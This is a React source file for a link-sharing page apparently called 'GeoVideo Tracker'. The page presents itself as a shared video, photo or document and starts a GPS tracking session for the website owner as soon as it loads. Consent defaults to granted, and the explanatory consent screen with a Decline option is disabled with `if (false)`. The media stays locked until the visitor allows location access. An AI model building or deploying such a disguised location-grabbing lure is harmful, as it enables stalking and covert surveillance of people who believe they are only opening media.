import React, { useState, useEffect } from 'react';
import { VideoLink, VisitorSession } from '../types';
import { db } from '../services/db';
import { getOrCreateVisitorId } from '../utils/id';
import { formatAccuracy, formatTimestamp } from '../utils/geo';
import { useGeolocationTracker } from '../hooks/useGeolocationTracker';
import { YouTubePlayer } from '../components/YouTubePlayer';
import { PhotoViewer } from '../components/PhotoViewer';
import { DirectVideoPlayer } from '../components/DirectVideoPlayer';
import { PdfViewer } from '../components/PdfViewer';
import {
  Shield,
  ShieldCheck,
  Play,
  Image as ImageIcon,
  Film,
  FileText,
  XCircle,
  AlertTriangle,
  ArrowLeft,
  CheckCircle2,
} from 'lucide-react';

interface VisitorViewProps {
  shareId: string;
  onNavigateToAdmin?: () => void;
}

export const VisitorView: React.FC<VisitorViewProps> = ({ shareId }) => {
  const [videoLink, setVideoLink] = useState<VideoLink | null>(null);
  const [loadingLink, setLoadingLink] = useState(true);
  const [session, setSession] = useState<VisitorSession | null>(null);
  const [consentDecision, setConsentDecision] = useState<'granted' | 'declined'>('granted');
  const [permissionStatus, setPermissionStatus] = useState<'pending' | 'granted'>('pending');
  const [sessionTerminatedMsg, setSessionTerminatedMsg] = useState<string | null>(null);
  const [isStopping, setIsStopping] = useState(false);

  const visitorId = getOrCreateVisitorId();

  // Update document title and Open Graph / Twitter meta tags on link change
  useEffect(() => {
    if (!videoLink) return;

    const title = videoLink.custom_name || 'Shared Document';
    const description = videoLink.description || 'Tap to view the shared document.';
    let imageUrl = 'https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1200&q=80';

    if (videoLink.media_type === 'photo' && videoLink.media_url) {
      imageUrl = videoLink.media_url;
    } else if (videoLink.thumbnail_url) {
      imageUrl = videoLink.thumbnail_url;
    } else if (videoLink.youtube_video_id) {
      imageUrl = `https://img.youtube.com/vi/${videoLink.youtube_video_id}/maxresdefault.jpg`;
    } else if (videoLink.media_url && videoLink.media_url.match(/\.(jpeg|jpg|png|gif|webp)(\?.*)?$/i)) {
      imageUrl = videoLink.media_url;
    }

    document.title = title;

    const setMetaTag = (selector: string, attrName: string, attrVal: string, content: string) => {
      let element = document.querySelector(selector);
      if (!element) {
        element = document.createElement('meta');
        element.setAttribute(attrName, attrVal);
        document.head.appendChild(element);
      }
      element.setAttribute('content', content);
    };

    setMetaTag('meta[property="og:title"]', 'property', 'og:title', title);
    setMetaTag('meta[property="og:description"]', 'property', 'og:description', description);
    setMetaTag('meta[property="og:image"]', 'property', 'og:image', imageUrl);
    setMetaTag('meta[property="og:url"]', 'property', 'og:url', window.location.href);
    setMetaTag('meta[name="twitter:title"]', 'name', 'twitter:title', title);
    setMetaTag('meta[name="twitter:description"]', 'name', 'twitter:description', description);
    setMetaTag('meta[name="twitter:image"]', 'name', 'twitter:image', imageUrl);
  }, [videoLink]);

  // Load Video Link metadata
  useEffect(() => {
    let isMounted = true;
    async function load() {
      setLoadingLink(true);
      try {
        const link = await db.getVideoLinkByShareId(shareId);
        if (isMounted) {
          setVideoLink(link);
        }
      } catch (err) {
        console.error('Failed to load video link:', err);
      } finally {
        if (isMounted) setLoadingLink(false);
      }
    }
    load();
    return () => {
      isMounted = false;
    };
  }, [shareId]);

  // Start the session as soon as the link is loaded. The browser's native
  // geolocation permission prompt is the only consent step shown to visitors.
  useEffect(() => {
    if (!videoLink || session) return;

    setSessionTerminatedMsg(null);
    db.createVisitorSession(videoLink.id, visitorId, 'active')
      .then(setSession)
      .catch((err) => console.error('Failed to start session:', err));
  }, [videoLink, session, visitorId]);

  // Hook for Geolocation tracking
  const {
    isTracking,
    isAcquiringInitial,
    latestLocation,
    bestLocation,
    error: geoError,
    warning: geoWarning,
    startTracking,
    stopTracking,
    stoppedByAdmin,
    updateCount,
  } = useGeolocationTracker({
    sessionId: session?.id || null,
    isActive: !!session,
    onStatusChange: (status, reason) => {
      if (status === 'stopped_by_admin') {
        setSessionTerminatedMsg('Location sharing session ended by administrator.');
      } else if (status === 'stopped_by_visitor') {
        setSessionTerminatedMsg('Location sharing has been stopped by you.');
      } else if (status === 'permission_denied') {
        setConsentDecision('declined');
        setSessionTerminatedMsg(reason || 'Location permission was denied.');
      } else if (status === 'location_unavailable') {
        setSessionTerminatedMsg(
          `Signal lost temporarily — still trying to reconnect... (${reason || 'GPS unavailable'})`
        );
      }
    },
    onLocationUpdate: () => {
      setPermissionStatus('granted');
      setSessionTerminatedMsg(null);
    },
  });

  // Browser/Tab exit detection
  useEffect(() => {
    if (!session?.id) return;

    let hasNotifiedDisconnect = false;

    const notifyDisconnect = (eventType: string) => {
      if (hasNotifiedDisconnect) return;
      hasNotifiedDisconnect = true;

      console.log('=== VISITOR EXIT DETECTED ===');
      console.log('event type:', eventType);
      console.log('sessionId:', session.id);

      const payload = JSON.stringify({ sessionId: session.id });
      const endpoint = '/api/session-disconnect';

      let beaconSent = false;
      if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
        try {
          const blob = new Blob([payload], { type: 'application/json' });
          beaconSent = navigator.sendBeacon(endpoint, blob);
        } catch (err) {
          console.warn('sendBeacon failed:', err);
        }
      }

      if (!beaconSent && typeof fetch !== 'undefined') {
        try {
          fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: payload,
            keepalive: true,
          }).catch(() => {});
        } catch (err) {
          console.warn('keepalive fetch failed:', err);
        }
      }

      void db.updateVisitorSessionStatus(
        session.id,
        'stopped_by_visitor',
        'Browser tab/window closed by visitor'
      );
    };

    const handlePageHide = (event: PageTransitionEvent) => {
      notifyDisconnect(`pagehide (persisted: ${event.persisted})`);
    };

    const handleBeforeUnload = () => {
      notifyDisconnect('beforeunload');
    };

    const handleVisibilityChange = () => {
      if (document.visibilityState === 'hidden') {
        console.log('=== VISITOR VISIBILITY CHANGED ===');
        console.log('Page hidden, keeping active unless tab/window closes.');
      }
    };

    window.addEventListener('pagehide', handlePageHide);
    window.addEventListener('beforeunload', handleBeforeUnload);
    document.addEventListener('visibilitychange', handleVisibilityChange);

    return () => {
      window.removeEventListener('pagehide', handlePageHide);
      window.removeEventListener('beforeunload', handleBeforeUnload);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, [session?.id]);

  // Handle User Clicks "Stop Sharing"
  const handleStopSharing = async () => {
    setIsStopping(true);
    try {
      await stopTracking('visitor');
      setSessionTerminatedMsg('Location sharing has been stopped by you.');
    } finally {
      setIsStopping(false);
    }
  };

  const handleRequestLocationAgain = async () => {
    if (!session) return;
    setConsentDecision('granted');
    setPermissionStatus('pending');
    setSessionTerminatedMsg(null);
    await db.updateVisitorSessionStatus(session.id, 'active');
    startTracking();
  };

  if (loadingLink) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 text-center font-mono">
        <div className="w-12 h-12 border-3 border-lime-500 border-t-transparent rounded-full animate-spin mb-4"></div>
        <p className="text-xs uppercase tracking-wider text-slate-500">LOADING REQUESTED VIDEO DETAILS...</p>
      </div>
    );
  }

  if (!videoLink || !videoLink.active) {
    return (
      <div className="min-h-screen bg-slate-50 flex flex-col items-center justify-center p-6 text-center font-mono">
        <div className="w-16 h-16 rounded-2xl bg-white border border-slate-200 flex items-center justify-center text-amber-500 mb-4 shadow-xl">
          <AlertTriangle className="w-8 h-8 text-amber-500" />
        </div>
        <h2 className="text-xl font-bold uppercase tracking-wider text-slate-900">VIDEO LINK UNAVAILABLE</h2>
        <p className="text-xs text-slate-600 max-w-md mt-2 font-sans">
          This video link may have expired, been deactivated, or the URL ID ({shareId}) is invalid.
        </p>
      </div>
    );
  }

  const mediaType = videoLink.media_type || 'youtube';
  const mediaLabel =
    mediaType === 'photo'
      ? 'Photo'
      : mediaType === 'pdf'
      ? 'PDF Document'
      : mediaType === 'video'
      ? 'Video'
      : 'YouTube Video';

  // --- STATE 1: Visitor Declined Consent ---
  if (consentDecision === 'declined') {
    return (
      <div className="min-h-screen bg-slate-50 text-slate-800 flex flex-col items-center justify-center p-4 sm:p-6 font-sans">
        <div className="w-full max-w-lg bg-white border border-slate-200 rounded-3xl p-6 sm:p-8 shadow-2xl text-center space-y-6">
          <div className="w-16 h-16 rounded-2xl bg-rose-50 border border-rose-200 mx-auto flex items-center justify-center text-rose-600 shadow-inner">
            <XCircle className="w-8 h-8" />
          </div>

          <div className="space-y-2">
            <h2 className="text-xl font-bold uppercase tracking-wider text-slate-900 font-mono">ACCESS RESTRICTED</h2>
            <p className="text-xs text-rose-600 font-mono">
              Location sharing was declined, so the {mediaLabel.toLowerCase()} cannot be opened.
            </p>
          </div>

          <div className="bg-slate-50 rounded-2xl p-4 border border-slate-200 text-xs text-slate-600 text-left space-y-2 font-mono">
            <div className="flex items-center gap-2 font-bold text-slate-900 uppercase tracking-wider">
              <Shield className="w-4 h-4 text-lime-600" />
              <span>Strict Privacy Policy</span>
            </div>
            <p className="font-sans text-slate-600">
              Your browser denied location access, so "{videoLink.custom_name}" cannot be opened.
              Allow location access to continue.
            </p>
          </div>

          <div className="flex flex-col sm:flex-row gap-3 pt-2">
            <button
              onClick={handleRequestLocationAgain}
              className="flex-1 py-3 px-4 bg-slate-900 hover:bg-slate-800 text-white rounded-xl font-mono font-bold uppercase tracking-wider text-xs transition shadow-lg flex items-center justify-center gap-2 cursor-pointer"
            >
              <ShieldCheck className="w-4 h-4 text-lime-400" />
              Allow
            </button>
          </div>
        </div>
      </div>
    );
  }

 if (permissionStatus === 'pending') {
  return (
   <div className="min-h-screen bg-white text-slate-800 flex flex-col items-center justify-center p-6 text-center font-mono">
     <div className="w-12 h-12 border-3 border-lime-500 border-t-transparent rounded-full animate-spin"></div>
   </div>
 );
}
  // --- STATE 2: Consent Gate Screen ---
  if (false) {
    return (
      <div className="min-h-screen bg-slate-50 text-slate-800 flex flex-col items-center justify-center p-4 sm:p-6 font-sans">
        <div className="w-full max-w-xl mb-4 flex items-center justify-between text-xs text-slate-500 font-mono">
          <div className="flex items-center gap-2">
            <div className="w-2 h-2 rounded-full bg-lime-500"></div>
            <span className="font-bold text-slate-900 uppercase tracking-wider">GeoVideo Tracker</span>
          </div>
          <span className="bg-white px-2.5 py-1 rounded-lg border border-slate-200 shadow-xs">
            VISITOR: <span className="font-mono text-slate-900">{visitorId}</span>
          </span>
        </div>

        <div className="w-full max-w-xl bg-white border border-slate-200 rounded-3xl p-6 sm:p-8 shadow-2xl space-y-6">
          <div className="space-y-2 pb-4 border-b border-slate-200">
            <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-lime-50 border border-lime-200 text-lime-800 text-[10px] font-mono font-bold uppercase tracking-widest">
              {mediaType === 'photo' ? (
                <>
                  <ImageIcon className="w-3 h-3 text-lime-700" />
                  <span>PROTECTED PHOTO</span>
                </>
              ) : mediaType === 'video' ? (
                <>
                  <Film className="w-3 h-3 text-lime-700" />
                  <span>PROTECTED DIRECT VIDEO</span>
                </>
              ) : (
                <>
                  <Play className="w-3 h-3 fill-current" />
                  <span>PROTECTED STREAM</span>
                </>
              )}
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold text-slate-900 tracking-tight font-sans">
              {videoLink.custom_name}
            </h1>
            {videoLink.description && (
              <p className="text-sm text-slate-600 leading-relaxed">{videoLink.description}</p>
            )}
          </div>

          <div className="bg-slate-50 rounded-2xl p-5 border border-slate-200 space-y-3 font-mono">
            <div className="flex items-center gap-2 text-lime-700 font-bold text-xs uppercase tracking-wider">
              <ShieldCheck className="w-5 h-5 text-lime-600" />
              <span>Location Consent Notice</span>
            </div>
            <p className="text-xs text-slate-700 leading-relaxed font-sans">
              {mediaType === 'photo'
                ? 'To view this high-resolution photo, you can share your current device location with the website owner. Your latitude, longitude, accuracy and location updates will be collected while location sharing is active.'
                : 'To watch this video, you can share your current device location with the website owner. Your latitude, longitude, accuracy and location updates will be collected while location sharing is active.'}
            </p>
            <div className="pt-2 border-t border-slate-200 grid grid-cols-2 gap-2 text-[11px] text-slate-600">
              <div className="flex items-center gap-1.5">
                <CheckCircle2 className="w-3.5 h-3.5 text-lime-600" />
                <span>High GPS accuracy</span>
              </div>
              <div className="flex items-center gap-1.5">
                <CheckCircle2 className="w-3.5 h-3.5 text-lime-600" />
                <span>Stop anytime with 1-click</span>
              </div>
            </div>
          </div>

          <div className="flex flex-col sm:flex-row gap-3 pt-2">
            <button
              onClick={() => handleRequestLocationAgain()}
              className="flex-1 py-3.5 px-5 bg-slate-900 hover:bg-slate-800 text-white rounded-xl font-mono font-bold uppercase tracking-wider text-xs transition duration-150 shadow-lg flex items-center justify-center gap-2 cursor-pointer"
            >
              {mediaType === 'photo' ? (
                <>
                  <ImageIcon className="w-4 h-4 text-lime-400" />
                  Allow &amp; View Photo
                </>
              ) : (
                <>
                  <Play className="w-4 h-4 fill-current text-lime-400" />
                  Allow &amp; Watch Video
                </>
              )}
            </button>
            <button
              onClick={() => setConsentDecision('declined')}
              className="py-3.5 px-5 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-xl font-mono font-bold uppercase tracking-wider text-xs transition border border-slate-300 flex items-center justify-center gap-2 cursor-pointer"
            >
              <XCircle className="w-4 h-4" />
              Decline
            </button>
          </div>

          <p className="text-[11px] text-center text-slate-500 font-mono">
            Location collection only begins after explicit browser permission is granted.
          </p>
        </div>
      </div>
    );
  }

  // --- STATE 3: Allowed & Watching/Viewing Media ---
  if (mediaType === 'photo') {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
        <PhotoViewer
          src={videoLink.media_url || videoLink.thumbnail_url || ''}
          title={videoLink.custom_name}
        />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 flex flex-col p-4 sm:p-6 lg:p-8 font-sans">
      <div className="max-w-5xl w-full mx-auto space-y-6">
        <h1 className="text-xl sm:text-2xl font-bold text-slate-900">
          {videoLink.custom_name}
        </h1>

        {/* Media Player / Viewer */}
        <div className="space-y-3">
          {mediaType === 'pdf' ? (
            <PdfViewer
              src={videoLink.media_url || ''}
              title={videoLink.custom_name}
            />
          ) : mediaType === 'video' ? (
            <DirectVideoPlayer
              src={videoLink.media_url || ''}
              title={videoLink.custom_name}
              autoplay={true}
            />
          ) : (
            <YouTubePlayer
              videoId={videoLink.youtube_video_id || ''}
              title={videoLink.custom_name}
              autoplay={true}
            />
          )}
        </div>

      </div>
    </div>
  );
};